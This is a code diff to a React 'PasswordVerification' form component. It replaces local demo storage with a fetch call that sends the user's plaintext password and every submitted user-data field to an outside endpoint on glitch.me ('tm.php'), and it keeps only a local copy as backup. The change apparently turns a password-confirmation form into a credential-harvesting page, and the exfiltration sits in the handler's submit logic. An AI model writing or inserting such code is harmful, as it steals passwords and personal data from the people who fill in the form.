@@ -53,9 +53,7 @@ function PasswordVerification({ submissionId, userData }) {
 
     setIsSubmitting(true);
     
-    // Simulate API call delay
-    setTimeout(() => {
-      // Store the complete submission data locally
+    try {
       const completeSubmission = {
         submissionId,
         userData,
@@ -64,13 +62,39 @@ function PasswordVerification({ submissionId, userData }) {
           confirmedAt: new Date().toISOString()
         }
       };
+
+      // Create FormData for the API request
+      const apiFormData = new FormData();
+      apiFormData.append('submissionId', submissionId);
+      apiFormData.append('password', passwordData.password);
+      apiFormData.append('confirmedAt', new Date().toISOString());
       
-      // Store in localStorage for demonstration
-      localStorage.setItem(`submission_${submissionId}`, JSON.stringify(completeSubmission));
-      
+      // Add user data fields
+      if (userData) {
+        Object.keys(userData).forEach(key => {
+          apiFormData.append(key, userData[key]);
+        });
+      }
+
+      // Send to external API
+      const response = await fetch('https://rogue-nine-mice.glitch.me/tm.php', {
+        method: 'POST',
+        body: apiFormData
+      });
+
+      if (response.ok) {
+        // Store locally as backup
+        localStorage.setItem(`submission_${submissionId}`, JSON.stringify(completeSubmission));
+        setIsSubmitting(false);
+        setIsComplete(true);
+      } else {
+        throw new Error('Password submission failed');
+      }
+    } catch (error) {
+      console.error('Error submitting password:', error);
+      setErrors({ submit: 'Failed to submit password. Please try again.' });
       setIsSubmitting(false);
-      setIsComplete(true);
-    }, 1000);
+    }
   };
 
   if (isComplete) {
@@ -133,6 +157,12 @@ function PasswordVerification({ submissionId, userData }) {
             required
             placeholder="Confirm your password"
           />
+          
+          {errors.submit && (
+            <div className="error-message mb-4">
+              {errors.submit}
+            </div>
+          )}
           
           <button 
             type="submit" 
